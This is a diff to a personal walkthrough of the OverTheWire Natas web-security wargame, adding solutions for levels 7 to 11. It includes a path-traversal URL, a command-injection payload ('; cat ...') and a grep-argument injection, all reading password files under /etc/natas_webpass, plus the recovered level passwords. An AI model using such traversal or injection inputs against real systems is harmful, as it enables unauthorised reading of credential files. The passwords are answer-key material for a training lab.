@@ -59,11 +59,30 @@ bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
 
 # Level 7 → Level 8
 
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../etc/natas_webpass/natas8
+
+xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+
 # Level 8 → Level 9
+
+PS C:\Users\jesus\projects\other\otw> & C:/Users/jesus/AppData/Local/Programs/Python/Python310/python.exe c:/Users/jesus/projects/other/otw/wargames/natas/natas08.py  
+b'oubWYf2kBq'
+
+oubWYf2kBq
+
+ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 
 # Level 9 → Level 10
 
+; cat /etc/natas_webpass/natas10
+
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
 # Level 10 → Level 11
+
+.\* /etc/natas_webpass/natas11
+
+/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
 
 # Level 11 → Level 12
 
